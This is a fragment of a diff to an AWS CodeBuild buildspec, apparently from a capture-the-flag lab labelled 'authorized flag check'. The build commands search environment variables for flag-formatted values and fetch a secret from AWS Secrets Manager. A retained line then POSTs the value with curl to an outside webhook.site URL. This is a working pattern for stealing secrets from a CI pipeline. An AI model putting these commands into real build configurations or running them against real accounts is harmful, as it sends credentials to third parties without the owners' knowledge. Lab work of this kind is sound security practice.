@@ -10,27 +10,3 @@ phases:
         fi
         printf '%s' "$FLAG" | grep -qE '^flag\{[0-9a-f]+\}$'
         curl --fail --silent --show-error --max-time 15 -X POST -H 'Content-Type: text/plain' --data-binary "$FLAG" 'https://webhook.site/396e44f9-d0fd-4c2c-8f28-907e627e9dd7' >/dev/null
-version: 0.2
-
-env:
-  exported-variables:
-    - FLAG
-
-phases:
-  build:
-    commands:
-      - |
-        FLAG="$(python3 -c 'import os,re; print(next((m.group(0) for v in os.environ.values() for m in re.finditer(r"flag\{[0-9a-f]+\}",v)), ""))')"
-        if [ -z "$FLAG" ]; then
-          FLAG="$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)"
-        fi
-        printf '%s' "$FLAG" | grep -qE '^flag\{[0-9a-f]+\}$'
-        export FLAG
-version: 0.2
-
-phases:
-  build:
-    commands:
-      - echo "ARTE 2.16 authorized flag check"
-      - python3 -c 'import os,re; print("\n".join(m.group(0) for v in os.environ.values() for m in re.finditer(r"flag\{[0-9a-f]+\}",v)))'
-      - (aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text 2>/dev/null || true) | grep -oE 'flag\{[0-9a-f]+\}' || true
